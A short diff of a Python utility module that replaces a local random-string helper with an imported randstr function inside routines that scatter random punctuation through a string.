@@ -18,6 +18,7 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 
 import base64, codecs
+from core.utils import randstr
 from random import random, randrange, choice, shuffle, randint
 
 class Counter(dict):
@@ -41,17 +42,12 @@ class Counter(dict):
         if kwds:
             self.update(kwds)
 
-def random_string(charset = 'abcdefghijklmnopqrstuvwxyz', len=4, fixed=False):
-	if not fixed:
-		len = randrange(2,len)
-	return ''.join([choice(charset) for i in xrange(len)])
-
 def pollute_with_random_str(str, charset = '!"#$%&()*-,./:<>?@[\]^_`{|}~', frequency=0.3):
 
 	str_encoded = ''
 	for char in str:
 		if random() < frequency:
-			str_encoded += random_string(charset, 1, True) + char
+			str_encoded += randstr(1, True, charset) + char
 		else:
 			str_encoded += char
 			
@@ -78,7 +74,7 @@ def find_randstr_not_in_str(str, charset):
 
 	while True:
 
-		pollution_chars = random_string(charset, 16, True)
+		pollution_chars = randstr(16, True, charset)
 			
 		pollution = ''
 		found = False
